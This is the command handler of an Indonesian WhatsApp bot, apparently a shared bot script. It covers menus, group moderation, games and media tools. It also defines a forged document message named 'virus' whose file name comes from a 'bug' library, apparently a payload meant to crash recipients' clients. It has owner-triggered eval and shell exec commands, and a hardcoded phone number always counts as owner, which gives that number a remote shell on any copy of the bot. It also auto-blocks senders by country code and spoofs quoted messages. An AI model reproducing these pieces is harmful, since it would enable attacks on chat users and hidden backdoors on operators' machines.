"use strict";
const { default: makeWASocket, useSingleFileAuthState, downloadContentFromMessage } = require("@adiwajshing/baileys")
const Baileys = require("@adiwajshing/baileys")
const fs = require ("fs");
const qrcode = require("qrcode-terminal");
const axios = require('axios')
const logg = require('pino')
const cheerio = require("cheerio")
const moment = require("moment-timezone");
const Dym = require("didyoumean");
const hikki = require("hikki-me");
const JavaScriptObfuscator = require("javascript-obfuscator");
const hx = require("hxz-api");
const util = require("util");
const Jimp = require("jimp");
const imageToBase64 = require('image-to-base64');
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const speed = require("performance-now");
const qs = require("querystring");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon()
const request = require("request");
const FormData = require("form-data");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const path = require('path');
const ms = require("parse-ms");
const toMS = require("ms");
const nou = require("node-os-utils");
const _sewa = require("./lib/sewa");
const tictac = require("./lib/tictac");
const tictacsolo = require("./lib/tictactoe-solo");
let { sizeFormatter } = require("human-readable");
let format = sizeFormatter({
  std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
  decimalPlaces: 2,
  keepTrailingZeroes: false,
  render: (literal, symbol) => `${literal} ${symbol}B`,
});

const Exif = require("./lib/exif")
const exif = new Exif()
 
let ttcsolo = [];
let tictactoe = [];

// Lib
const { igProfile, insta, igstory } = require("./lib/instagram");
const { goLens } = require("./lib/googlens");
const { Musikmatch } = require("./lib/lirik");
const { pinterest } = require("./lib/pinterest")
const { 
isTicTacToe,
getPosTic } = require("./lib/tictactoe");
const { addAfkUser,
    checkAfkUser,
    getAfkReason,
    getAfkTime,
    getAfkId,
    getAfkPosition } = require("./lib/afk");
const { isSetLeft,
    addSetLeft,
    removeSetLeft,
    changeSetLeft,
    getTextSetLeft } = require('./lib/data/setleft');
const { color, bgcolor } = require('./lib/color')
const { ngazap } = require('./lib/data/bug-ampas')
const { isSetWelcome, changeSetWelcome, addSetWelcome, removeSetWelcome, getTextSetWelcome } = require("./lib/data/setwelcome.js");
const { bytesToSize, checkBandwidth } = require("./lib/function.js");
const { serialize, getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, runtime, sleep, generateProfilePicture, reSize, makeid, removeEmojis, calculate_age } = require("./lib/myfunc");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/data/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/data/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/data/setdone');

// Database 
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let mess = JSON.parse(fs.readFileSync('./function/mess.json'));
let setting = JSON.parse(fs.readFileSync('./config.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let db_menfes = JSON.parse(fs.readFileSync('./database/menfess.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
let anonymous = JSON.parse(fs.readFileSync('./database/anonymous.json'));

moment.tz.setDefault("Asia/Jakarta").locale("id");

var packnamenya = 'Ceev-Bot'
var authornya = 'BY 4LL3ZZY'

module.exports = async(lexxy, msg, m, setting, store, welcome, left, set_welcome_group, set_left_db, db_respon_list, set_proses, set_done, set_open, set_close) => {
    try {
        let { ownerNumber, ownerName, botName, footer, packname, author } = setting

// MESSAGE
let { menuall } = require('./help')
let { textdonasi } = require('./help')

        let footxt = `${footer}`
        let thumb = await reSize(fs.readFileSync(setting.pathimg), 200, 200, [])
        const { type, quotedMsg, now, fromMe, mentioned, isBaileys } = msg
        if (isBaileys) return
        const tanggal = moment().tz("Asia/Jakarta").format("ll")
        const jam = moment().format("HH:mm:ss z")
        let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
        var fildt = dt == 'Pagi' ? dt + '' : dt == 'Siang' ? dt + '' : dt == 'Sore' ? dt + '' : dt + ''
        const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
        const content = JSON.stringify(msg.message)
        const from = msg.key.remoteJid
        const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
        const toJSON = j => JSON.stringify(j, null,'\t')
        if (lexxy.multi) {
        	var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        } else {
        	if (lexxy.nopref) {
                prefix = ''
        	} else { 
                prefix = lexxy.prefa
        	}
        }
           var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
                var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
                const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
        const args = chats.split(' ')
        const budy = (typeof msg.text == 'string' ? msg.text : '')
        const command = chats.toLowerCase().split(' ')[0] || ''
        const isCmd = command.startsWith(prefix)
        const isGroup = msg.key.remoteJid.endsWith('@g.us')
        const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
      	const isOwner = ownerNumber == sender ? true : ["6283834558105@s.whatsapp.net"].includes(sender) ? true : false
        const pushname = msg.pushName
        const q = chats.slice(command.length + 1, chats.length)
        const isNan = args[1]
        const body = chats.startsWith(prefix) ? chats : ''
        const quoted = msg.quoted ? msg.quoted : msg
        const botNumber = lexxy.user.id.split(':')[0] + '@s.whatsapp.net'
        const groupMetadata = isGroup ? await lexxy.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupId = isGroup ? groupMetadata.id : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupDesc = isGroup ? groupMetadata.desc : ''
        const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
        const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
        const isGroupAdmins = groupAdmins.includes(sender)
        const isUser = pendaftar.includes(sender)
        const gcount = setting.limitGame
        const isAntiWame = antiwame.includes(from) ? true : false
        const isAntiLink = antilink.includes(from) ? true : false  
        const isLeft = left.includes(from) ? true : false
        const isWelcome = isGroup ? welcome.includes(from) ? true : false : false

const isDeveloper = ["6283834558105@s.whatsapp.net"].includes(sender) ? true : false

const isAfkOn = checkAfkUser(sender, _afk)
const isSewa = _sewa.checkSewaGroup(from, sewa)

        let timestamp = speed();
        let latensi = speed() - timestamp

        let wangsaf = "0@s.whatsapp.net"

        const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        
        try {
        var pp_user = await lexxy.profilePictureUrl(sender, 'image')
        } catch {
        var pp_user = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
        }
                    
        async function downloadAndSaveMediaMessage (type_file, path_file) {
        	if (type_file === 'image') {
                var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'video') {
                var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'sticker') {
                var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	} else if (type_file === 'audio') {
                var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
                let buffer = Buffer.from([])
                for await(const chunk of stream) {
                	buffer = Buffer.concat([buffer, chunk])
                }
                fs.writeFileSync(path_file, buffer)
                return path_file
        	}
        }
        const sendFileFromUrl = async (from, url, caption, options = {}) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headerd["content-type"]
            let type = mime.split("/")[0]+"Message"
            if (mime.split("/")[0] === "image") {
               var img = await getBuffer(url)
               return lexxy.sendMessage(from, { image: img, caption: caption }, options)
            } else if (mime.split("/")[0] === "video") {
               var vid = await getBuffer(url)
               return lexxy.sendMessage(from, { video: vid, caption: caption }, options)
            } else if (mime.split("/")[0] === "audio") {
               var aud = await getBuffer(url)
               return lexxy.sendMessage(from, { audio: aud, mimetype: 'audio/mp3' }, options)
            } else {
               var doc = await getBuffer(url)
               return lexxy.sendMessage(from, { document: doc, mimetype: mime, caption: caption }, options)
            }
        }
        
    function toCommas(x) {
	x = x.toString()
	var pattern = /(-?\d+)(\d{3})/;
     while (pattern.test(x))
	   x = x.replace(pattern, "$1,$2");
	return x;
}
        async function sendPlay(from, query) {
            var url = await yts(query)
            url = url.videos[0].url
            hx.youtube(url).then(async(data) => {
                var button = [{ urlButton: { displayText: `Source Code`, url: `${url}` } }, { quickReplyButton: { displayText: `Audio`, id: `${prefix}ytmp3 ${url}` } }, { quickReplyButton: { displayText: `Video`, id: `${prefix}ytmp4 ${url}` } }]

                lexxy.sendMessage(from, { caption: `*｢  YOUTUBE PLAY  ｣*\n\n❒ *Title :* ${data.title ? data.title : '-'}\n❒ *Quality :* ${data.quality}\n\n_Silahkan Pilih Format yang ada dibawah_`, image: { url: data.thumb }, templateButtons: button, footer: 'Pilih Media Yang Anda Inginkan', mentions: [sender] })
           }).catch((e) => {
               lexxy.sendMessage(from, { text: mess.error.api }, { quoted: msg })
               ownerNumber.map( i => lexxy.sendMessage(from, { text: `Send Play Error : ${e}` }))
           })
        }
        function formatDate(n, locale = 'id') {
                   let d = new Date(n)
                   return d.toLocaleDateString(locale, { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric'})
                }
        function hitungmundur(bulan, tanggal) {
            let from = new Date(`${bulan} ${tanggal}, 2022 00:00:00`).getTime();
            let now = Date.now();
            let distance = from - now;
            let days = Math.floor(distance / (1000 * 60 * 60 * 24));
            let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            let seconds = Math.floor((distance % (1000 * 60)) / 1000);
            return days + "Hari " + hours + "Jam " + minutes + "Menit " + seconds + "Detik"
        }
        const isUrl = (url) => {
        	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        
const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];	

        const isEmoji = (emo) => {
            let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
            let regexEmoji = new RegExp(emoji_ranges, 'gi');
            return emo.match(regexEmoji)
        }
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function monospace(string) {
            return '```' + string + '```'
        }
        function randomNomor(min, max = null) {
            if (max !== null) {
        	    min = Math.ceil(min);
        	    max = Math.floor(max);
        	    return Math.floor(Math.random() * (max - min + 1)) + min;
            } else {
        	    return Math.floor(Math.random() * min) + 1
            }
        }
        const pickRandom = (arr) => {
        	return arr[Math.floor(Math.random() * arr.length)]
        }
        function mentions(teks, mems = [], id) {
        	if (id == null || id == undefined || id == false) {
        	    let res = lexxy.sendMessage(from, { text: teks, mentions: mems })
        	    return res
        	} else {
                let res = lexxy.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
                return res
            }
        }
        const nebal = (angka) => {
            return Math.floor(angka)
        }
        function parseMention(text = '') {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }
        const reply = (teks) => {
        	return lexxy.sendMessage(from, { text: teks, mentions: parseMention(teks) }, { quoted: msg })
        }
        
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${setting.footer}`,jpegThumbnail: fs.readFileSync(setting.pathimg)}}} //Fake Document
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `BOT-MD`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;BOT-MD,;;;\nFN:BOT-MD,\nitem1.TEL;waid=${botNumber}:${botNumber}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./media/logo.jpg')}}} // fake kontak
        
        const textImg = (teks) => {
        	return lexxy.sendMessage(from, { text: teks, jpegThumbnail: fs.readFileSync(setting.pathimg), mentions: parseMention(teks) }, { quoted: msg })
        }
        
        const sendMess = (hehe, teks) => {
        	lexxy.sendMessage(hehe, { text, teks })
        }
        const buttonWithText = (from, text, footer, buttons) => {
        	return lexxy.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
        }
        
const ini_virus_nya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

        const sendContact = (jid, numbers, name, quoted, mn) => {
        	let number = numbers.replace(/[^0-9]/g, '')
        	const vcard = 'BEGIN:VCARD\n' 
        	+ 'VERSION:3.0\n' 
        	+ 'FN:' + name + '\n'
        	+ 'ORG:;\n'
        	+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
        	+ 'END:VCARD'
        	return lexxy.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
        }

        async function getGcName(groupID) {
            try {
                let data_name = await lexxy.groupMetadata(groupID)
                return data_name.subject
            } catch (err) {
                return '-'
            }
        }

        async function sendStickerFromUrl(from, url, packname1 = stc.packname, author1 = stc.author, options = {}) {
        	var names = Date.now() / 10000;
        	var download = function (uri, filename, callback) {
                request.head(uri, function (err, res, body) {
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
	            });
        	};
            exif.create(packname1, author1, `sendstc_${names}`)
        	download(url, './sticker/' + names + '.png', async function () {
                let filess = './sticker/' + names + '.png'
        	    let asw = './sticker/' + names + '.webp'
        	    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, async (err) => {
        	        exec(`webpmux -set exif ./sticker/sendstc_${names}.exif ${asw} -o ${asw}`, async (error) => {
                        lexxy.sendMessage(from, { sticker: fs.readFileSync(asw) }, options)
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
        	        })
                })
        	})
        }
        
        function toRupiah(angka) {
                   var balancenyeini = '';
                   var angkarev = angka.toString().split('').reverse().join('');
                   for (var i = 0; i < angkarev.length; i++)
                   if (i % 3 == 0) balancenyeini += angkarev.substr(i, 3) + '.';
                   return '' + balancenyeini.split('', balancenyeini.length - 1).reverse().join('');
                }
                
        const buttonsDefault = [
	        { quickReplyButton: { displayText: `Rules`, id: `${prefix}rules` } },
			{ quickReplyButton: { displayText: `Donasi`, id: `${prefix}donasi` } },
			{ quickReplyButton: { displayText: `Dashboard`, id: `${prefix}dashboard` } }
			]
    
        const buttonsTopup = [
        	{ quickReplyButton: { displayText: `konfirmasi`, id: `${prefix}tp2 ${q.split("|")[0]}|${q.split("|")[1]}` } }
		     ]
const buttonsGames = [
		{ quickReplyButton: { displayText: `back to menu`, id: `${prefix}menu` } },
			{ quickReplyButton: { displayText: `contact owner`, id: `${prefix}owner` } }
		]
		
                // Function for Anonymous Chat
                function anonyCheck(who = '', _db) {
                   return [_db.a, _db.b].includes(who)
                }
                function anonyOther(who = '', _db) {
                    return who == _db.a ? _db.b : who == _db.b ? _db.a : ''
                }

// ANTILINK
if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (chats.match(/(https:\/\/)/gi)) {
if (!isBotGroupAdmins) return reply(`Untung bot bukan admin`)
reply(`*「 LINK TERDETEKSI 」*\n\nSepertinya kamu mengirim Link, maaf kamu akan di kick`)
lexxy.groupParticipantsUpdate(from, [sender], "remove")
}
}
        
//ANTI WAME
if (isGroup && isAntiWame && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (chats.match(/(wa.me)/gi)) {
if (!isBotGroupAdmins) return reply(`Untung bot bukan admin`)
reply(`*「 WAME DETECTOR 」*\n\nSepertinya kamu mengirim Wa.me, maaf kamu akan di kick`)
lexxy.groupParticipantsUpdate(from, [sender], "remove")
}
}

if (isTicTacToe(from, tictactoe)) tictac(chats, prefix, tictactoe, from, sender, reply, mentions)
if (isTicTacToe(from, ttcsolo)) tictacsolo(lexxy, chats, prefix, ttcsolo, msg)
    
        // Store
        if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
            var get_data_respon = getDataResponList(from, chats, db_respon_list)
            if (get_data_respon.isImage === false) {
                lexxy.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
                    quoted: msg
                })
            } else {
                lexxy.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
                    quoted: msg
                })
            }
        }
        

                // Auto Write Database Anonymous Every 30 Second's
                setInterval(async () => {
                  fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonymous, null, 2))
                }, 30 * 1000)

                var cekForAnon = isCmd && args[0].length > 1

                // For Action Anonymous Chat
                if (!isGroup && !msg.key.fromMe && !cekForAnon) {
                   let rums = Object.values(anonymous).find(room => [room.a, room.b].includes(sender) && room.state == "CHATTING")
                   if (rums) {
                     var partnerJID = [rums.a, rums.b].find(user => user !== sender)
                     if (msg.type == "conversation") {
                       lexxy.sendMessage(partnerJID, { text: chats })
                     } else if (msg.type == "extendedTextMessage") {
                       lexxy.sendMessage(partnerJID, { text: chats, contextInfo: msg.message["extendedTextMessage"].contextInfo })
                     } else {
                       var contextInfo = msg.message[msg.type].contextInfo
                       lexxy.sendMessageFromContent(partnerJID, msg.message, { contextInfo })
                     }
                   }
                }

        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedMsg = msg.isQuotedMsg
        const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
        const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
        const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
        const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
        const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false

// Auto Registrasi
if (isCmd && !isUser) {
pendaftar.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
}

// Sewa
_sewa.expiredCheck(lexxy, sewa)
                
const lordHitt = await fetchJson(`https://api.countapi.xyz/hit/Lexxy/visits`)

		
//Auto Block Nomor Luar
if (sender.startsWith('212')) {
return lexxy.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('91')) {
return lexxy.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('92')) {
return lexxy.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('90')) {
return lexxy.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('54')) {
return lexxy.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('55')) {
return lexxy.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('40')) {
return lexxy.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('94')) {
return lexxy.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('60')) {
return lexxy.updateBlockStatus(sender, 'block')
}

const cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_menfes).forEach((i) => {
if (db_menfes[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_menfes[x1].id } 
if (satu == "status"){ return db_menfes[x1].status } 
if (satu == "teman"){ return db_menfes[x1].teman } 
if (satu == "gender"){ return db_menfes[x1].gender }
}
if (x1 == false) { return null } 
}

	if (chats.startsWith("> ") && isOwner) {
                   console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
                   const ev = (sul) => {
                     var sat = JSON.stringify(sul, null, 2)
                     var bang = util.format(sat)
                     if (sat == undefined) {
                       bang = util.format(sul)
                     }
                     return textImg(bang)
                   }
                   try {
                     textImg(util.format(eval(`;(async () => { ${chats.slice(2)} })()`)))
                   } catch (e) {
                     textImg(util.format(e))
                   }
                } else if (chats.startsWith("$ ") && isOwner) {
                   console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
                   exec(chats.slice(2), (err, stdout) => {
                     if (err) return reply(`${err}`)
                     if (stdout) reply(`${stdout}`)
                   })
                } else if (chats.startsWith("x ") && isOwner) {
                   console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkaokwoak`))
                   try {
                     let evaled = await eval(chats.slice(2))
                     if (typeof evaled !== 'string') evaled = require("util").inspect(evaled)
                     reply(`${evaled}`)
                   } catch (err) {
                     reply(`${err}`)
                   }
                }

                // Function for AFK
                if (isGroup && !isBaileys && !fromMe) {
                  if (mentioned.length !== 0) {
                    for (let ment of mentioned) {
                      if (checkAfkUser(ment, _afk)) {
                        const getId = afk.getAfkId(ment, _afk)
                        const getReason = afk.getAfkReason(getId, _afk)
                        const getTime = Date.now() - afk.getAfkTime(getId, _afk)
                        const heheh = ms(getTime)
                        await reply(`@${ment.split('@')[0]} sedang afk\n\n*Alasan :* ${getReason}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu`)
                      }
                    }
                  }
                  
                  if (checkAfkUser(sender, _afk)) {
                    _afk.splice(getAfkPosition(sender, _afk), 1)
                    fs.writeFileSync('./database/afk.json', JSON.stringify(_afk, null, 2))
                    await mentions(`@${sender.split('@')[0]} telah kembali`, [sender], true)
                  }
                }

		// Logs
		if (!isGroup && isCmd && !fromMe) {
		    console.log(color('[ CMD ]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
		}
		if (isGroup && isCmd && !fromMe) {
		    console.log(color('[ CMD ]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
		}
       
const ini_hitnya = await fetchJson(`https://api.countapi.xyz/hit/Lexxy/visits`)

const teks_menu = `*Selamat ${ucapanWaktu} ${pushname}*

––––––––––––––––––––
━━━「 *DATA* 」━━━━━━
 ⫹ Library : *Baileys-MD*.
 ⫹ Global Hit : ${ini_hitnya.value}
 ⫹ Total Pengguna : ${pendaftar.length}
 ⫹ Waktu : ${tanggal}
 ⫹ Jam : ${jam}
━━━━━━━━━━━━━━━━━━━
━━━「 *USER* 」━━━━━━
⫹ Name : ${pushname}
⫹ Tag : @${sender.split("@")[0]}
⫹ Status : ${isOwner ? 'Owner':'User'}
━━━━━━━━━━━━━━━━━━━
––––––––––––––––––––
━━━━━━━━━━━━━━━━━━━
  _---------[ *LIST-MENU* ]---------_
${menuall(sender, prefix, pushname, ucapanWaktu, tanggal, jam, isOwner)}

_*Runtime Bot :*_
${runtime(process.uptime())}`

switch(command) {
//━━━━━━━━━━━━━━━[ MAIN MENU ]━━━━━━━━━━━━━━━━━//
case prefix+'infogc':
case prefix+'infogrup':
case prefix+'infogroup':
let cekgcnya =`*INFO GROUP*
• id : ${from}
• nama : ${groupName}
• member : ${groupMembers.length}
• admin : ${groupAdmins.length}
• antilink : ${isAntiLink? "on":"off"}
• welcome : ${isWelcome? "on":"off"}

*Descripsi*:
${groupDesc}`
reply(cekgcnya)

break
case prefix+'cekmenu':
reply(teks_menu)
break
case prefix+'unblock':{
if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh :\n${command} 628xxxx`)
var nomorNya = q
await lexxy.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "unblock") // Unblock user
reply('Sukses Unblock Nomor')
}
break
case prefix+'block':{
if (!isOwner && !fromMe) return reply(mess.OnlyOwner)
if (!q) return reply(`Contoh :\n${command} 628xxxx`)
var nomorNya = q
await lexxy.updateBlockStatus(`${nomorNya}@s.whatsapp.net`, "block") // Block user
reply('Sukses Block Nomor')
}
break

case prefix+'server':{
let anuinfopc = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v)
let anuinfogc = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let infoText =`*INFO SERVER*
• Pengguna : ${pendaftar.length}
• Chat Group : ${anuinfogc.length}
• Chat Pribadi : ${anuinfopc.length}`
reply(infoText)
}
break
case prefix+"nickml": {
if (!q) return reply(`Contoh :\n${command} 109088431|2558`)

reply(`*Searching Username ml 🔎*\n${q}`)
var myID = q.split("|")[0]
var mySER = q.split("|")[1]
hikki.game.nickNameMobileLegends(myID, mySER).then( res => {
console.log(res)
reply(`*CEK NICKML*\n${res.userName}`)
});
}
break
case prefix+"nickff":{
if (!q) return reply(`Contoh :\n${command} 239814337`)
reply(`*Searching Username ff 🔎*\n${q}`)
hikki.game.nickNameFreefire(q).then(det => {
console.log(det)
reply(`*CEK NICKFF*\n${det.userName}`)
});
}
break
case "nicksupersus":{
if (!q) return reply(`Contoh :\n${command} 20431364`)
reply(`*Searching Username supersus 🔎*\n${q}`)
hikki.game.superSusChecker(q).then(det => {
console.log(det)
reply(`*CEK NICKSUPERSUS*\nid : ${det.id}\nname : ${det.name}`)
});
}
break
case prefix+'cekuser':


lexxy.sendMessage(from, {text: `Pengguna : ${pendaftar.length}`, quoted: msg})


break
case prefix+'emojimix': {
if (!q) return reply(`Example :\n${command} 😅+🤔`)
		var mytext = body.slice(10)
		let [emoji1, emoji2] = mytext.split`+`
